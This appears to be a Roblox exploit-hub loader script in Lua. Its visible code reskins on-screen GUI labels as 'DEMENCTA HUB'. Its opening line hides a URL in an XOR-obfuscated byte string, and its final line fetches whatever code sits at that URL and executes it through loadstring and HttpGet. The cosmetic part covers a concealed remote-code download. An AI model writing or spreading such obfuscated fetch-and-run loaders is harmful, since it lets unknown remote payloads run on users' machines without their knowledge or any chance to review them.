
--[[ STAGE 2: VISUAL CORE ]]
local Z3rnYNkDBuyHYbc2GSD="\137\152\159\158\144\174\214\213\111\157\122\160\108\097\115\122\074\122\076\077\118\070\074\069\091\080\068\080\041\106\082\045\034\103\037\057\063\033\048\063\010\061\013\005\009\091\013\016\030\027\022\225\018\236\227\037\250\237\248\240\052\239\195\243\247\192\204\201\243\217\169\219\213\163\210\227\212\223\176\191\178\189\143\185\213\133\181\181\147\221\221\212\215\160\158\129\096\121\121\109\102\099\138\131\130\131\129\075\155\066\153\094\042\069"local tdsTbVaHk3qqqUAw3DFTg=106 local uWZ2SqvWpnau1=101 local MwiAM5M67kYwwQ=1 local _AnaacZsCj9o=3 local HpE61rhKKFzi9E48OLvmCS=19 local C4bPmZ1AXQCvH=false local n8tpBjcNlUzE=bit32 and bit32.bxor if not n8tpBjcNlUzE then n8tpBjcNlUzE=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local DT3fHvJfyfvqJj8u6a={}for Rbj2aIw0TUdXX1XR=1,#Z3rnYNkDBuyHYbc2GSD do local SGU8ckheE5NjX1y1BRiJzj=string.byte(Z3rnYNkDBuyHYbc2GSD,Rbj2aIw0TUdXX1XR)local bonf3uvivaof8M=(uWZ2SqvWpnau1+(Rbj2aIw0TUdXX1XR*_AnaacZsCj9o)+HpE61rhKKFzi9E48OLvmCS)%256 if MwiAM5M67kYwwQ==0 then SGU8ckheE5NjX1y1BRiJzj=(SGU8ckheE5NjX1y1BRiJzj-bonf3uvivaof8M)%256 DT3fHvJfyfvqJj8u6a[Rbj2aIw0TUdXX1XR]=string.char(n8tpBjcNlUzE(SGU8ckheE5NjX1y1BRiJzj,tdsTbVaHk3qqqUAw3DFTg))else SGU8ckheE5NjX1y1BRiJzj=n8tpBjcNlUzE(SGU8ckheE5NjX1y1BRiJzj,tdsTbVaHk3qqqUAw3DFTg)DT3fHvJfyfvqJj8u6a[Rbj2aIw0TUdXX1XR]=string.char((SGU8ckheE5NjX1y1BRiJzj-bonf3uvivaof8M)%256)end end local TJkSySjuW0fXU=table.concat(DT3fHvJfyfvqJj8u6a)if C4bPmZ1AXQCvH then TJkSySjuW0fXU=string.reverse(TJkSySjuW0fXU)end local duuUnoqv4mWGAOd=TJkSySjuW0fXU
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(duuUnoqv4mWGAOd))()
